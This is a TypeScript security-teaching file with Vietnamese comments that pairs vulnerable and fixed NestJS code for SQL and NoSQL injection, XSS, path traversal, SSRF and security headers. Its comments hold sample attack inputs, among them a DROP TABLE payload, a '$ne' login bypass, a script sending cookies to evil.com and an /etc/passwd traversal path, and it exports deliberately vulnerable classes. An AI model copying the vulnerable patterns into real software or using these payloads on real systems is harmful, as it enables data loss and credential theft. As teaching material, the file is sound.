/**
 * ============================================
 * SECURITY #4: DATA SANITIZATION
 * ============================================
 *
 * Nguyên tắc:
 * 1. Sanitize output — ngăn XSS (Cross-Site Scripting)
 * 2. Parameterized queries — ngăn SQL/NoSQL Injection
 * 3. Không concat string vào query
 * 4. Escape HTML entities trong user-generated content
 * 5. Content Security Policy headers
 * 6. Validate và sanitize URLs, filenames
 */

// ═══════════════════════════════════════════
// Rule 4.1: SQL Injection Prevention
// ═══════════════════════════════════════════

// ❌ BAD: String concatenation → SQL Injection
class UserRepository_BAD {
  async findByName(name: string): Promise<unknown[]> {
    // Input: name = "'; DROP TABLE users; --"
    // Query: SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
    const query = `SELECT * FROM users WHERE name = '${name}'`;
    console.log('Dangerous query:', query);
    return [];
  }

  async searchProducts(keyword: string, minPrice: string): Promise<unknown[]> {
    // Cả 2 params đều vulnerable!
    const query = `
      SELECT * FROM products
      WHERE name LIKE '%${keyword}%'
      AND price > ${minPrice}
    `;
    console.log('Dangerous query:', query);
    return [];
  }
}

// ✅ GOOD: Parameterized queries
/*
class UserRepository {
  // TypeORM Query Builder — tự động parameterize
  async findByName(name: string): Promise<User[]> {
    return this.repo
      .createQueryBuilder('user')
      .where('user.name = :name', { name }) // Parameterized!
      .getMany();
  }

  async searchProducts(keyword: string, minPrice: number): Promise<Product[]> {
    return this.repo
      .createQueryBuilder('product')
      .where('product.name ILIKE :keyword', { keyword: `%${keyword}%` })
      .andWhere('product.price > :minPrice', { minPrice })
      .getMany();
  }

  // Raw query — vẫn phải parameterize!
  async customQuery(status: string): Promise<any[]> {
    return this.repo.query(
      'SELECT * FROM orders WHERE status = $1 AND created_at > $2',
      [status, new Date('2024-01-01')],
    );
  }
}
*/

// ═══════════════════════════════════════════
// Rule 4.2: NoSQL Injection Prevention
// ═══════════════════════════════════════════

// ❌ BAD: MongoDB — operator injection
/*
// Input: { email: "admin@mail.com", password: { "$ne": "" } }
// → Bypass authentication!
async login(body: any): Promise<User | null> {
  return this.userModel.findOne({
    email: body.email,
    password: body.password, // Có thể là object chứa $ne, $gt, etc.
  });
}
*/

// ✅ GOOD: Validate type trước khi query
/*
async login(dto: LoginDto): Promise<User | null> {
  // class-validator đảm bảo email và password là string
  // (không phải object chứa operator)
  return this.userModel.findOne({
    email: dto.email, // Guaranteed string
    password: dto.password, // Guaranteed string
  });
}

// Hoặc explicit type check:
function sanitizeMongoInput(input: unknown): string {
  if (typeof input !== 'string') {
    throw new BadRequestException('Invalid input type');
  }
  return input;
}
*/

// ═══════════════════════════════════════════
// Rule 4.3: XSS Prevention
// ═══════════════════════════════════════════

// ❌ BAD: Lưu HTML trực tiếp từ user input
class CommentService_BAD {
  async createComment(content: string): Promise<{ content: string }> {
    // Input: '<script>document.location="https://evil.com/steal?cookie="+document.cookie</script>'
    // → Stored XSS!
    return { content };
  }
}

// ✅ GOOD: Sanitize HTML trước khi lưu
function escapeHtml(unsafe: string): string {
  return unsafe
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// Cho rich text — dùng thư viện sanitize
/*
import * as sanitizeHtml from 'sanitize-html';

function sanitizeRichText(html: string): string {
  return sanitizeHtml(html, {
    allowedTags: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'li', 'ol'],
    allowedAttributes: {
      'a': ['href', 'title'],
    },
    allowedSchemes: ['https'], // Chỉ cho phép https links
    disallowedTagsMode: 'escape', // Escape thay vì xóa
  });
}
*/

class CommentService_GOOD {
  createComment(content: string): { content: string; sanitized: string } {
    const sanitized = escapeHtml(content);
    return { content, sanitized };
  }
}

// ═══════════════════════════════════════════
// Rule 4.4: URL và Path Sanitization
// ═══════════════════════════════════════════

// ❌ BAD: Path traversal vulnerability
/*
@Get('files/:filename')
async getFile(@Param('filename') filename: string, @Res() res: Response) {
  // Input: filename = "../../etc/passwd"
  const filePath = path.join('/uploads', filename);
  res.sendFile(filePath); // Trả về /etc/passwd!
}
*/

// ✅ GOOD: Validate và sanitize path
function sanitizeFilename(filename: string): string {
  // Remove path traversal characters
  const sanitized = filename
    .replace(/\.\./g, '')           // Remove ..
    .replace(/[/\\]/g, '')          // Remove path separators
    .replace(/[^a-zA-Z0-9._-]/g, '_'); // Only allow safe chars

  if (!sanitized || sanitized.startsWith('.')) {
    throw new Error('Invalid filename');
  }

  return sanitized;
}

function sanitizeUrl(url: string): string | null {
  try {
    const parsed = new URL(url);
    // Chỉ cho phép http/https
    if (!['http:', 'https:'].includes(parsed.protocol)) {
      return null;
    }
    // Block internal IPs
    const blockedHosts = ['localhost', '127.0.0.1', '0.0.0.0', '169.254.169.254'];
    if (blockedHosts.includes(parsed.hostname)) {
      return null; // SSRF protection
    }
    return parsed.toString();
  } catch {
    return null;
  }
}

// ═══════════════════════════════════════════
// Rule 4.5: Security Headers (Helmet)
// ═══════════════════════════════════════════

// ✅ GOOD: Security headers cho NestJS
/*
// main.ts
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      frameSrc: ["'none'"],
    },
  },
  crossOriginEmbedderPolicy: true,
  crossOriginOpenerPolicy: true,
  crossOriginResourcePolicy: { policy: 'same-site' },
  hsts: { maxAge: 31536000, includeSubDomains: true },
  noSniff: true,
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
}));

// CORS
app.enableCors({
  origin: process.env.ALLOWED_ORIGINS?.split(',') || ['http://localhost:3000'],
  methods: ['GET', 'POST', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,
  maxAge: 3600,
});
*/

export {
  UserRepository_BAD,
  CommentService_BAD,
  CommentService_GOOD,
  escapeHtml,
  sanitizeFilename,
  sanitizeUrl,
};
